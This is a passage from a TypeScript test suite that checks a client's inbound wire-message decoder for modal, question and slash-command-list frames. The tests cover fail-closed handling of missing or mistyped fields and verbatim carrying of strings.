    expect(parseInboundMessage(encodeMessage(MSG))).toEqual({ kind: 'message', message: MSG })
  })
})

describe('parseInboundMessage — modal_shown fail-closed (#201)', () => {
  it('throws when class is absent, a non-string, or a string outside the closed enum', () => {
    const bad: unknown[] = [
      (() => {
        const { class: _dropped, ...missing } = MODAL_SHOWN
        return missing
      })(), // class absent
      { ...MODAL_SHOWN, class: 42 }, // non-string
      { ...MODAL_SHOWN, class: null },
      { ...MODAL_SHOWN, class: {} },
      { ...MODAL_SHOWN, class: 'destructive' }, // a string outside the closed enum (no destructive class)
      { ...MODAL_SHOWN, class: '' } // empty string is still outside the enum
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeModalShown(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when any string field is absent (never a partial)', () => {
    for (const field of ['conversation_id', 'modal_id', 'title', 'prompt', 'default_option_id'] as const) {
      const { [field]: _dropped, ...missing } = MODAL_SHOWN
      expect(() => parseInboundMessage(encodeModalShown(missing))).toThrow(WireDecodeError)
    }
  })

  it('throws when any string field is a non-string (number, object, null)', () => {
    const bad: unknown[] = [
      { ...MODAL_SHOWN, conversation_id: 42 },
      { ...MODAL_SHOWN, conversation_id: null },
      { ...MODAL_SHOWN, conversation_id: {} },
      { ...MODAL_SHOWN, modal_id: 42 },
      { ...MODAL_SHOWN, title: {} },
      { ...MODAL_SHOWN, prompt: null },
      { ...MODAL_SHOWN, default_option_id: ['a'] }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeModalShown(payload))).toThrow(WireDecodeError)
    }
  })

  it('lets no partial escape when only conversation_id is missing (#870)', () => {
    // Every other field is well-formed, so the frame would decode were the new narrow absent. The
    // throw precedes the return: no partially-decoded modal-shown reaches a consumer.
    const { conversation_id: _dropped, ...missing } = MODAL_SHOWN
    expect(() => parseInboundMessage(encodeModalShown(missing))).toThrow(WireDecodeError)
    expect(() => parseInboundMessage(encodeModalShown(missing))).toThrow(
      'missing required field: conversation_id'
    )
  })

  it('throws when options is absent or not an array', () => {
    const bad: unknown[] = [
      (() => {
        const { options: _dropped, ...missing } = MODAL_SHOWN
        return missing
      })(), // options absent
      { ...MODAL_SHOWN, options: {} },
      { ...MODAL_SHOWN, options: 'x' },
      { ...MODAL_SHOWN, options: 3 }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeModalShown(payload))).toThrow(WireDecodeError)
    }
  })

  it('fails the whole modal closed when any single option is invalid', () => {
    const bad: unknown[] = [
      { ...MODAL_SHOWN, options: [{ id: 'allow', label: 'Allow' }, 'not-an-object'] },
      { ...MODAL_SHOWN, options: [{ id: 'allow' }] }, // label missing
      { ...MODAL_SHOWN, options: [{ label: 'Allow' }] }, // id missing
      { ...MODAL_SHOWN, options: [{ id: 42, label: 'Allow' }] }, // id non-string
      { ...MODAL_SHOWN, options: [{ id: 'allow', label: 7 }] } // label non-string
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeModalShown(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when a modal_shown payload is not an object', () => {
    expect(() => parseInboundMessage(encodeModalShown('nope'))).toThrow(WireDecodeError)
    expect(() => parseInboundMessage(encodeModalShown(['a']))).toThrow(WireDecodeError)
  })
})

describe('parseInboundMessage — modal_dismissed recognition (#201, additive)', () => {
  it('narrows a full modal_dismissed into { kind: modal-dismissed } for each of the three sources', () => {
    for (const source of ['remote', 'local', 'timeout'] as const) {
      const payload = { ...MODAL_DISMISSED, source }
      expect(parseInboundMessage(encodeModalDismissed(payload))).toEqual({
        kind: 'modal-dismissed',
        modalDismissed: payload
      })
    }
  })

  it('carries an opaque outcome (an option id or a sentinel) verbatim, never enum-checked', () => {
    const sentinel = { ...MODAL_DISMISSED, outcome: '__timeout__' }
    expect(parseInboundMessage(encodeModalDismissed(sentinel))).toEqual({
      kind: 'modal-dismissed',
      modalDismissed: sentinel
    })
  })

  it('drops unknown server keys, keeping only the three known fields (forward-compat)', () => {
    const withExtras = { ...MODAL_DISMISSED, conversation_id: 'conv-1', extra: 'ignore-me' }
    expect(parseInboundMessage(encodeModalDismissed(withExtras))).toEqual({
      kind: 'modal-dismissed',
      modalDismissed: MODAL_DISMISSED
    })
  })

  it('still routes a message to its existing kind (additive, unchanged)', () => {
    expect(parseInboundMessage(encodeMessage(MSG))).toEqual({ kind: 'message', message: MSG })
  })
})

describe('parseInboundMessage — modal_dismissed fail-closed (#201)', () => {
  it('throws when source is absent, a non-string, or a string outside the closed enum', () => {
    const bad: unknown[] = [
      { modal_id: 'mdl-7f3a', outcome: 'allow' }, // source absent
      { ...MODAL_DISMISSED, source: 42 }, // non-string
      { ...MODAL_DISMISSED, source: null },
      { ...MODAL_DISMISSED, source: {} },
      { ...MODAL_DISMISSED, source: 'admin' }, // a string outside the closed enum
      { ...MODAL_DISMISSED, source: '' } // empty string is still outside the enum
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeModalDismissed(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when modal_id or outcome is absent or a non-string', () => {
    const bad: unknown[] = [
      { outcome: 'allow', source: 'remote' }, // modal_id absent
      { ...MODAL_DISMISSED, modal_id: 42 },
      { modal_id: 'mdl-7f3a', source: 'remote' }, // outcome absent
      { ...MODAL_DISMISSED, outcome: null }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeModalDismissed(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when a modal_dismissed payload is not an object', () => {
    expect(() => parseInboundMessage(encodeModalDismissed('nope'))).toThrow(WireDecodeError)
    expect(() => parseInboundMessage(encodeModalDismissed(['a']))).toThrow(WireDecodeError)
  })
})

/** A batch carrying exactly the given questions — for reject cases that vary one nesting level. */
function batchWith(questions: unknown): unknown {
  return { ...QUESTION_SHOWN, questions }
}

/** One question carrying exactly the given options — for reject cases at the option level. */
function questionWith(options: unknown): unknown {
  return { ...ONE_QUESTION, options }
}

describe('parseInboundMessage — question_shown recognition (#884, additive)', () => {
  it('narrows a full question_shown into { kind: question-shown } carrying every field verbatim', () => {
    // An exact toEqual, not a field-by-field spot check: it is what catches a key transposition between
    // the two same-typed strings at each level, and what proves unknown keys are not spread through.
    expect(parseInboundMessage(encodeQuestionShown(QUESTION_SHOWN))).toEqual({
      kind: 'question-shown',
      questionShown: QUESTION_SHOWN
    })
  })

  it('preserves question and option order, and both multi_select positions', () => {
    const result = parseInboundMessage(encodeQuestionShown(QUESTION_SHOWN))
    if (result?.kind !== 'question-shown') throw new Error('expected a question-shown')
    const { questions } = result.questionShown
    expect(questions.map((q) => q.header)).toEqual(['Write strategy', 'Eviction'])
    expect(questions.map((q) => q.multi_select)).toEqual([false, true])
    // Array position IS the display order at both levels — a reordering here is a product bug.
    expect(questions[1].options.map((o) => o.label)).toEqual(['LRU', 'LFU', 'TTL'])
  })

  it('stops reaching the inbound-unmodeled arm (#884, AC1)', () => {
    // The behaviour this slice exists to change. Before it, the frame fell to `default:` and logged
    // inbound-unmodeled; the log record is what actually distinguishes decoded from swallowed.
    const { log, lines } = captureLog()
    parseInboundMessage(encodeQuestionShown(QUESTION_SHOWN), log)
    const record = JSON.parse(lines[0])
    expect(record.event).toBe('inbound-decoded')
    expect(record.code).toBe('question_shown')
  })

  it('decodes the all-zero fixture — an empty string is a VALUE, not an absence', () => {
    expect(parseInboundMessage(encodeQuestionShown(QUESTION_SHOWN_ZERO))).toEqual({
      kind: 'question-shown',
      questionShown: QUESTION_SHOWN_ZERO
    })
  })

  it('decodes an empty questions array without throwing (AC3)', () => {
    // Out of contract daemon-side (a producer bug), but this decoder polices TYPE, not membership,
    // and a client must not crash on one. The daemon's own question_shown_empty.json fixture.
    expect(parseInboundMessage(encodeQuestionShown(batchWith([])))).toEqual({
      kind: 'question-shown',
      questionShown: { ...QUESTION_SHOWN, questions: [] }
    })
  })

  it('decodes an empty options array on a question without throwing (AC3)', () => {
    const question = questionWith([])
    expect(parseInboundMessage(encodeQuestionShown(batchWith([question])))).toEqual({
      kind: 'question-shown',
      questionShown: { ...QUESTION_SHOWN, questions: [question] }
    })
  })

  it('tolerates unknown keys at all three levels but does NOT copy them through', () => {
    // Forward-compat: a server-added key must not fail the decode, and must not ride into a consumer.
    const option = { ...ONE_QUESTION.options[0], future_option_key: 'x' }
    const question = { ...ONE_QUESTION, options: [option], future_question_key: 'y' }
    const result = parseInboundMessage(
      encodeQuestionShown({ ...QUESTION_SHOWN, questions: [question], future_payload_key: 'z' })
    )
    expect(result).toEqual({
      kind: 'question-shown',
      questionShown: {
        conversation_id: QUESTION_SHOWN.conversation_id,
        question_batch_id: QUESTION_SHOWN.question_batch_id,
        questions: [{ ...ONE_QUESTION, options: [ONE_QUESTION.options[0]] }]
      }
    })
  })

  it('copies every string through VERBATIM whatever its length — no bound, no truncation (AC5)', () => {
    // AC5 is a decision, not an omission: no maximum length is enforced anywhere daemon-side, and the
    // `header` cap is documented 12 but OBSERVED 14 runes, so a client trimming at 12 would mangle valid
    // traffic. The shipped "must be a fail-closed reject rather than a silent trim" caveat chooses between
    // two wrong behaviours should a bound ever exist; its operative half here is "never silently trim".
    // Asserted on LENGTH explicitly — a plain decode assertion would pass green against a truncating decode.
    const longQuestion = 'q'.repeat(10_000)
    const longHeader = 'H'.repeat(40)
    const longLabel = 'L'.repeat(5_000)
    const question = {
      ...ONE_QUESTION,
      question: longQuestion,
      header: longHeader,
      options: [{ label: longLabel, description: 'd'.repeat(5_000) }]
    }
    const result = parseInboundMessage(encodeQuestionShown(batchWith([question])))
    if (result?.kind !== 'question-shown') throw new Error('expected a question-shown')
    const decoded = result.questionShown.questions[0]
    expect(decoded.question).toHaveLength(10_000)
    expect(decoded.header).toHaveLength(40)
    expect(decoded.options[0].label).toHaveLength(5_000)
    expect(decoded.question).toBe(longQuestion)
    expect(decoded.header).toBe(longHeader)
    expect(decoded.options[0].label).toBe(longLabel)
  })
})

describe('parseInboundMessage — question_shown fail-closed (#884)', () => {
  it('throws when the payload is not a record', () => {
    for (const payload of ['nope', ['a'], 42, null, true]) {
      expect(() => parseInboundMessage(encodeQuestionShown(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when either payload string is absent or a non-string', () => {
    const bad: unknown[] = [
      (() => {
        const { conversation_id: _dropped, ...missing } = QUESTION_SHOWN
        return missing
      })(),
      (() => {
        const { question_batch_id: _dropped, ...missing } = QUESTION_SHOWN
        return missing
      })(),
      { ...QUESTION_SHOWN, conversation_id: 42 },
      { ...QUESTION_SHOWN, conversation_id: null },
      { ...QUESTION_SHOWN, question_batch_id: {} },
      { ...QUESTION_SHOWN, question_batch_id: ['qb'] }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeQuestionShown(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when questions is absent or not an array', () => {
    const bad: unknown[] = [
      (() => {
        const { questions: _dropped, ...missing } = QUESTION_SHOWN
        return missing
      })(),
      batchWith({}),
      batchWith('x'),
      batchWith(3),
      batchWith(null)
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeQuestionShown(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when a question is not a record, or either of its strings is absent / a non-string', () => {
    const bad: unknown[] = [
      batchWith(['not-an-object']),
      batchWith([null]),
      batchWith([['nested']]),
      batchWith([
        (() => {
          const { question: _dropped, ...missing } = ONE_QUESTION
          return missing
        })()
      ]),
      batchWith([
        (() => {
          const { header: _dropped, ...missing } = ONE_QUESTION
          return missing
        })()
      ]),
      batchWith([{ ...ONE_QUESTION, question: 42 }]),
      batchWith([{ ...ONE_QUESTION, header: null }])
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeQuestionShown(payload))).toThrow(WireDecodeError)
    }
  })

  it("throws when a question's options is absent or not an array", () => {
    const bad: unknown[] = [
      batchWith([
        (() => {
          const { options: _dropped, ...missing } = ONE_QUESTION
          return missing
        })()
      ]),
      batchWith([questionWith({})]),
      batchWith([questionWith('x')]),
      batchWith([questionWith(7)]),
      batchWith([questionWith(null)])
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeQuestionShown(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when multi_select is absent or not a REAL boolean (AC2)', () => {
    // The family's only boolean, and the branch a truthiness test would pass green while broken: the
    // string "false" is truthy, so `!!payload.multi_select` would decode it as `true`. requireBoolean
    // checks the TYPE, so every one of these fails closed.
    const bad: unknown[] = [
      (() => {
        const { multi_select: _dropped, ...missing } = ONE_QUESTION
        return missing
      })(),
      { ...ONE_QUESTION, multi_select: 'false' },
      { ...ONE_QUESTION, multi_select: 'true' },
      { ...ONE_QUESTION, multi_select: 0 },
      { ...ONE_QUESTION, multi_select: 1 },
      { ...ONE_QUESTION, multi_select: null }
    ]
    for (const question of bad) {
      expect(() => parseInboundMessage(encodeQuestionShown(batchWith([question])))).toThrow(
        WireDecodeError
      )
    }
  })

  it('throws when an option is not a record, or either of its strings is absent / a non-string', () => {
    const bad: unknown[] = [
      questionWith(['not-an-object']),
      questionWith([null]),
      questionWith([{ description: 'd' }]), // label missing
      questionWith([{ label: 'L' }]), // description missing
      questionWith([{ label: 42, description: 'd' }]),
      questionWith([{ label: 'L', description: {} }])
    ]
    for (const question of bad) {
      expect(() => parseInboundMessage(encodeQuestionShown(batchWith([question])))).toThrow(
        WireDecodeError
      )
    }
  })

  it('fails the WHOLE batch closed when any single option or question is malformed (AC2)', () => {
    // The parseModalOption posture, propagated by .map through two nesting levels: one bad leaf throws
    // the batch rather than dropping that leaf. A partial batch would silently hide a choice from the
    // operator while claude waits on an answer covering it.
    const badOptionInSecondQuestion = {
      ...QUESTION_SHOWN,
      questions: [ONE_QUESTION, questionWith([{ label: 'LRU' }])]
    }
    const badSecondQuestion = { ...QUESTION_SHOWN, questions: [ONE_QUESTION, 'not-an-object'] }
    for (const payload of [badOptionInSecondQuestion, badSecondQuestion]) {
      expect(() => parseInboundMessage(encodeQuestionShown(payload))).toThrow(WireDecodeError)
    }
  })

  it('lets no partial escape — a malformed batch never returns a value (AC2)', () => {
    // Every other field is well-formed, so the frame would decode were the nested narrow absent.
    const result = (): unknown =>
      parseInboundMessage(encodeQuestionShown(batchWith([questionWith([{ label: 'L' }])])))
    expect(result).toThrow(WireDecodeError)
    expect(result).toThrow('missing required field: description')
  })
})

describe('parseInboundMessage — question_dismissed recognition (#894, additive)', () => {
  it('narrows a full question_dismissed into { kind: question-dismissed } (AC1, AC4)', () => {
    expect(parseInboundMessage(encodeQuestionDismissed(QUESTION_DISMISSED))).toEqual({
      kind: 'question-dismissed',
      questionDismissed: QUESTION_DISMISSED
    })
  })

  it('decodes the live producer source `no_answer`, which WireModalSource would reject (AC2)', () => {
    // The single most likely mistake in this family, and the assertion that goes red if someone later
    // tightens `source` toward `modal_dismissed`'s closed `{remote, local, timeout}` set. Two of the
    // producer's three terminal paths — a caller disconnect and a daemon shutdown — have no member in
    // that set at all, so closing it would reject the only traffic that exists. `no_answer` is what
    // #1973 actually emits; the modal set's three values and an as-yet-unnamed future cause decode
    // identically, none of them enum-checked. A client reads an unrecognised value as *resolved, cause
    // unknown* and never as an answer — a reading rule this decoder documents and #850 enforces.
    for (const source of ['no_answer', 'timeout', 'remote', 'local', 'some_cause_named_later', '']) {
      const payload = { ...QUESTION_DISMISSED, source }
      expect(parseInboundMessage(encodeQuestionDismissed(payload))).toEqual({
        kind: 'question-dismissed',
        questionDismissed: payload
      })
    }
  })

  it('carries an opaque outcome sentinel verbatim, never enum-checked', () => {
    // `outcome` is producer-defined, exactly as ModalDismissedPayload.outcome is. Its published
    // contract is that it NEVER carries a claude-authored option label — a promise of the honest
    // producer, not something this decode verifies, so an arbitrary string still decodes.
    for (const outcome of ['unanswered', 'answered', '__sentinel__', '']) {
      const payload = { ...QUESTION_DISMISSED, outcome }
      expect(parseInboundMessage(encodeQuestionDismissed(payload))).toEqual({
        kind: 'question-dismissed',
        questionDismissed: payload
      })
    }
  })

  it('drops unknown server keys, keeping only the three known fields — conversation_id included (AC1)', () => {
    // `conversation_id` as the planted extra is the sharpest available pin on the DELIBERATE absence:
    // the batch nonce is the sole correlation key, and copying a stray one through would hand a
    // consumer two keys that can disagree.
    const withExtras = { ...QUESTION_DISMISSED, conversation_id: 'conv-1', extra: 'ignore-me' }
    expect(parseInboundMessage(encodeQuestionDismissed(withExtras))).toEqual({
      kind: 'question-dismissed',
      questionDismissed: QUESTION_DISMISSED
    })
  })

  it('decodes an all-empty payload — an empty string is a VALUE, not an absence', () => {
    const empty = { question_batch_id: '', outcome: '', source: '' }
    expect(parseInboundMessage(encodeQuestionDismissed(empty))).toEqual({
      kind: 'question-dismissed',
      questionDismissed: empty
    })
  })

  it('still routes a message to its existing kind (additive, unchanged)', () => {
    expect(parseInboundMessage(encodeMessage(MSG))).toEqual({ kind: 'message', message: MSG })
  })
})

describe('parseInboundMessage — question_dismissed fail-closed (#894)', () => {
  it('throws when the payload is not a record (AC3)', () => {
    const bad: unknown[] = ['nope', ['a'], 42, null, true]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeQuestionDismissed(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when question_batch_id is absent or a non-string (AC3)', () => {
    const bad: unknown[] = [
      { outcome: 'unanswered', source: 'no_answer' }, // absent
      { ...QUESTION_DISMISSED, question_batch_id: 42 },
      { ...QUESTION_DISMISSED, question_batch_id: null },
      { ...QUESTION_DISMISSED, question_batch_id: {} }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeQuestionDismissed(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when outcome is absent or a non-string (AC3)', () => {
    const bad: unknown[] = [
      { question_batch_id: 'qb-7f3a', source: 'no_answer' }, // absent
      { ...QUESTION_DISMISSED, outcome: 42 },
      { ...QUESTION_DISMISSED, outcome: null },
      { ...QUESTION_DISMISSED, outcome: ['unanswered'] }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeQuestionDismissed(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when source is absent or a non-string — but NOT for an unrecognised string (AC2, AC3)', () => {
    const bad: unknown[] = [
      { question_batch_id: 'qb-7f3a', outcome: 'unanswered' }, // absent
      { ...QUESTION_DISMISSED, source: 42 },
      { ...QUESTION_DISMISSED, source: null },
      { ...QUESTION_DISMISSED, source: {} }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeQuestionDismissed(payload))).toThrow(WireDecodeError)
    }
    // The boundary this arm defends is TYPE, not membership: the reject cases above are all non-strings.
    expect(() =>
      parseInboundMessage(encodeQuestionDismissed({ ...QUESTION_DISMISSED, source: 'admin' }))
    ).not.toThrow()
  })

  it('lets no partial escape — a frame missing one field never returns a value (AC3)', () => {
    // Every other field is well-formed, so the frame would decode were the narrow absent.
    const { source: _dropped, ...missingSource } = QUESTION_DISMISSED
    const result = (): unknown => parseInboundMessage(encodeQuestionDismissed(missingSource))
    expect(result).toThrow(WireDecodeError)
    expect(result).toThrow('missing required field: source')
  })
})

describe('parseInboundMessage — slash_command_list recognition (#936, additive)', () => {
  it('narrows a full frame into { kind: slash-command-list } carrying all three fields (AC1)', () => {
    expect(parseInboundMessage(encodeSlashCommandList(SLASH_COMMAND_LIST))).toEqual({
      kind: 'slash-command-list',
      slashCommandList: SLASH_COMMAND_LIST
    })
  })

  it('extracts every field on every row distinctly, in the WIRE\'s own order (AC1)', () => {
    // The core AC1 assertion, per-field across the rows (the background_task_roster idiom): a ROW SWAP
    // fails the ordered arrays, a DROPPED FIELD fails its own array, and a FLATTENED or MERGED aliases /
    // truncated_fields fails the last two — which is why the fixture's rows carry different alias-list
    // lengths and different truncated_fields shapes.
    const result = parseInboundMessage(encodeSlashCommandList(SLASH_COMMAND_LIST))
    expect(result?.kind).toBe('slash-command-list')
    if (result?.kind === 'slash-command-list') {
      const { slashCommandList: list } = result
      expect(list.conversation_id).toBe('c1')
      expect(list.commands.map((c) => c.name)).toEqual([
        'claude-api',
        'clear',
        'config',
        'model',
        'usage'
      ])
      expect(list.commands.map((c) => c.argument_hint)).toEqual([
        '',
        '[name]',
        'key=value',
        '<model>',
        ''
      ])
      expect(list.commands.map((c) => c.description)).toEqual(
        SLASH_COMMAND_LIST.commands.map((c) => c.description)
      )
      // Per row and NOT hoisted: each row's own alias list, in the wire's order.
      expect(list.commands.map((c) => c.aliases)).toEqual([
        [],
        ['reset', 'new'],
        ['settings'],
        [],
        ['cost', 'stats']
      ])
      expect(list.commands[0].truncated_fields).toEqual(['description'])
      expect(list.commands.filter((c) => c.truncated_fields === null)).toHaveLength(4)
      // dropped_commands decodes as a NUMBER, never a string.
      expect(list.dropped_commands).toBe(2)
      expect(typeof list.dropped_commands).toBe('number')
    }
  })

  it('carries all four strings and every alias byte-for-byte — nothing is trimmed or re-encoded (AC2)', () => {
    // The pin against a future "sanitize / normalise at the decoder" change. These strings are
    // WORKSPACE-AUTHORED, a lower trust tier than the claude-authored strings the neighbouring arms
    // carry, and the daemon bounds them without sanitizing them. Rewriting one here would make the two
    // ends disagree about what the command is CALLED; the escaping is owed at the render sink (#681).
    const result = parseInboundMessage(encodeSlashCommandList(SLASH_COMMAND_LIST))
    if (result?.kind === 'slash-command-list') {
      const [claudeApi, clear, , model] = result.slashCommandList.commands
      // An embedded newline and a non-ASCII rune, both measured on the real capture. `0x0a` is the only
      // sub-`0x20` byte that occurs, and it is exactly what would let a workspace author forge a log
      // record were any decoded value ever logged.
      expect(claudeApi.description).toBe(
        'Reference for the Claude API — model ids, pricing, params.\nTRIGGER — read first.'
      )
      expect(claudeApi.description).toContain('\n')
      // Raw angle brackets: Go's encoder escapes `<`/`>`/`&` on the wire, so the decoded value holds the
      // literal characters.
      expect(model.argument_hint).toBe('<model>')
      expect(clear.aliases).toEqual(['reset', 'new'])
    }
  })

  it('carries a name outside any identifier charset — no charset validation belongs here (AC2)', () => {
    // One measured name in the capture is `__remote-workflow`. A client that identifier-checked a name
    // would fail-close a valid frame; nothing here may key a cache or a lookup path by one either.
    const oddName = {
      ...SLASH_COMMAND_LIST,
      commands: [{ ...ONE_COMMAND, name: '__remote-workflow' }]
    }
    expect(parseInboundMessage(encodeSlashCommandList(oddName))).toEqual({
      kind: 'slash-command-list',
      slashCommandList: oddName
    })
  })

  it('decodes an EMPTY commands array — "claude offered nothing", never dropped (AC3)', () => {
    // The AC3 signal case, and what it DISTINGUISHES: this decodes to a VALUE, so a consumer can tell
    // "a menu arrived and it is empty" from "no menu was observed at all" (the `null` an unmodeled type
    // returns, asserted at the end of this block).
    const decoded = parseInboundMessage(encodeSlashCommandList(SLASH_COMMAND_LIST_EMPTY))
    expect(decoded).not.toBeNull()
    expect(decoded).toEqual({
      kind: 'slash-command-list',
      slashCommandList: SLASH_COMMAND_LIST_EMPTY
    })
    if (decoded?.kind === 'slash-command-list') {
      expect(decoded.slashCommandList.commands).toEqual([])
      // `0` is a VALUE, never consulted for truthiness: the Go field has no `omitempty`.
      expect(decoded.slashCommandList.dropped_commands).toBe(0)
    }
  })

  it('carries dropped_commands verbatim beside ANY list length — no cross-check, no cap (AC1)', () => {
    // Two producer cuts feed the count — an entry cap and a frame-level byte bound, both cutting from the
    // tail — and the byte bound can fire BEFORE the entry cap is reached. So a non-zero count arrives
    // beside any number of entries, list length is no evidence of completeness, and nothing here may
    // reconcile the two. An empty list with a non-zero count is the sharpest case.
    const droppedEverything = { ...SLASH_COMMAND_LIST_EMPTY, dropped_commands: 51 }
    expect(parseInboundMessage(encodeSlashCommandList(droppedEverything))).toEqual({
      kind: 'slash-command-list',
      slashCommandList: droppedEverything
    })
    // And the other side of it: no client-invented entry cap. The daemon owns that bound and the count is
    // workspace- and version-dependent (51 measured in one repository, 74 in another).
    const many = {
      ...SLASH_COMMAND_LIST,
      commands: Array.from({ length: 60 }, (_, i) => ({ ...ONE_COMMAND, name: `cmd-${i}` })),
      dropped_commands: 0
    }
    const decoded = parseInboundMessage(encodeSlashCommandList(many))
    if (decoded?.kind === 'slash-command-list') {
      expect(decoded.slashCommandList.commands).toHaveLength(60)
    }
  })

  it('keeps a row truncated_fields of null as null while one naming aliases survives intact (AC4)', () => {
    // The reading rule this arm exists to make sound: `aliases` collapses claude's ABSENT and EMPTY lists
    // into the identical `[]`, so a `truncated_fields` naming `aliases` is the ONLY signal separating
    // "cut to nothing" from "none" and must be read as UNKNOWN. Reached through a bare cast an omitted
    // key would decode to `undefined`, and `row.truncated_fields?.includes('aliases')` would then be
    // falsy for exactly the reason `null` is — silently inverting the rule and greying out a command that
    // works. Asserted through the predicate, not just round-tripped.
    const cutAliases = {
      ...SLASH_COMMAND_LIST,
      commands: [
        { ...ONE_COMMAND, aliases: [], truncated_fields: ['aliases'] },
        { ...ONE_COMMAND, aliases: [], truncated_fields: null }
      ]
    }
    const decoded = parseInboundMessage(encodeSlashCommandList(cutAliases))
    expect(decoded).toEqual({ kind: 'slash-command-list', slashCommandList: cutAliases })
    if (decoded?.kind === 'slash-command-list') {
      const [cut, none] = decoded.slashCommandList.commands
      expect(cut.truncated_fields?.includes('aliases')).toBe(true)
      expect(none.truncated_fields).toBeNull()
      expect(none.truncated_fields?.includes('aliases')).toBeUndefined()
      // Both rows read `[]` for aliases — which is the whole point: the two are told apart ONLY by
      // truncated_fields.
      expect(cut.aliases).toEqual([])
      expect(none.aliases).toEqual([])
    }
  })

  it('decodes the all-zero row — an empty hint and an empty aliases are ordinary values', () => {
    // The daemon's third fixture, and the only route that reaches all five keys at once. `argument_hint`
    // is empty on 33 of the capture's 51 entries, so `''` is the ORDINARY case, never missing data.
    const decoded = parseInboundMessage(encodeSlashCommandList(SLASH_COMMAND_LIST_ZERO))
    expect(decoded).toEqual({
      kind: 'slash-command-list',
      slashCommandList: SLASH_COMMAND_LIST_ZERO
    })
    if (decoded?.kind === 'slash-command-list') {
      const row = decoded.slashCommandList.commands[0]
      expect(row.argument_hint).toBe('')
      expect(row.aliases).toEqual([])
      expect(row.truncated_fields).toBeNull()
      expect(decoded.slashCommandList.conversation_id).toBe('')
    }
  })

  it('does NOT narrow the truncated_fields elements to a closed set (no client-side allowlist)', () => {
    // Each frame's cut-field vocabulary is its own set; a client allowlist would fail-close a valid
    // future frame (the parseBackgroundTask rule verbatim).
    const futureName = {
      ...SLASH_COMMAND_LIST,
      commands: [{ ...ONE_COMMAND, truncated_fields: ['name', 'some_future_field'] }]
    }
    expect(parseInboundMessage(encodeSlashCommandList(futureName))).toEqual({
      kind: 'slash-command-list',
      slashCommandList: futureName
    })
  })

  it('drops unknown server keys at the FRAME level, keeping exactly the three known fields', () => {
    // The pointed extra is a hoisted `truncated_fields` — the field this payload deliberately does NOT
    // have, since a cut is a property of one row — plus a `turn_id` this frame never carries either (it
    // rides a control_response and opens no turn).
    const withExtras = {
      ...SLASH_COMMAND_LIST,
      truncated_fields: ['commands'],
      turn_id: 'turn-1'
    }
    expect(parseInboundMessage(encodeSlashCommandList(withExtras))).toEqual({
      kind: 'slash-command-list',
      slashCommandList: SLASH_COMMAND_LIST
    })
  })

  it('drops unknown server keys at the ROW level, keeping exactly the five known fields', () => {
    const withRowExtras = {
      ...SLASH_COMMAND_LIST,
      commands: [{ ...ONE_COMMAND, task_id: 'task_01ABC', dropped_commands: 9 }]
    }
    expect(parseInboundMessage(encodeSlashCommandList(withRowExtras))).toEqual({
      kind: 'slash-command-list',
      slashCommandList: { ...SLASH_COMMAND_LIST, commands: [ONE_COMMAND] }
    })
  })

  it('still returns null for a well-formed envelope of another unmodeled type (no widening)', () => {
    const bytes = encodeEnvelope({ id: 1, type: 'ack', ts: FIXED_TS, payload: {} })
    expect(parseInboundMessage(bytes)).toBeNull()
  })
})

describe('parseInboundMessage — slash_command_list fail-closed (#936)', () => {
  it('throws when commands is null — the trap: a ROW truncated_fields null is a VALUE, this is not', () => {
    // The asymmetry, in one frame. `Array.isArray(null)` is `false`, which is what fails this closed,
    // while the per-row `truncated_fields: null` above decodes to `null` and is preserved. The daemon
    // settles it: MarshalJSON normalises a nil `commands` to `[]` so an empty menu never serialises as
    // null, and deliberately does NOT normalise a row's truncated_fields the same way.
    expect(() =>
      parseInboundMessage(encodeSlashCommandList({ ...SLASH_COMMAND_LIST, commands: null }))
    ).toThrow(WireDecodeError)
  })

  it('throws when the commands key is OMITTED — an absence is not an empty menu (AC3/AC5)', () => {
    const payload: Record<string, unknown> = { ...SLASH_COMMAND_LIST }
    delete payload.commands
    expect(() => parseInboundMessage(encodeSlashCommandList(payload))).toThrow(WireDecodeError)
  })

  it('throws when commands is any non-array (AC5)', () => {
    for (const value of ['x', 7, {}, true]) {
      const payload = { ...SLASH_COMMAND_LIST, commands: value }
      expect(() => parseInboundMessage(encodeSlashCommandList(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when conversation_id is absent or a non-string (AC5)', () => {
    const missing: Record<string, unknown> = { ...SLASH_COMMAND_LIST }
    delete missing.conversation_id
    expect(() => parseInboundMessage(encodeSlashCommandList(missing))).toThrow(WireDecodeError)
    for (const value of [42, null, { a: 1 }]) {
      const payload = { ...SLASH_COMMAND_LIST, conversation_id: value }
      expect(() => parseInboundMessage(encodeSlashCommandList(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when dropped_commands is OMITTED — an absence is not a zero (AC1/AC5)', () => {
    // Paired with the `dropped_commands: 0` case above: the Go field has no `omitempty`, so the key is
    // always on the wire and an absent one is a real defect rather than a valid zero.
    const payload: Record<string, unknown> = { ...SLASH_COMMAND_LIST }
    delete payload.dropped_commands
    expect(() => parseInboundMessage(encodeSlashCommandList(payload))).toThrow(WireDecodeError)
  })

  it('throws when dropped_commands arrives as a JSON string, never coercing it (AC5)', () => {
    for (const value of ['2', null, true, {}, []]) {
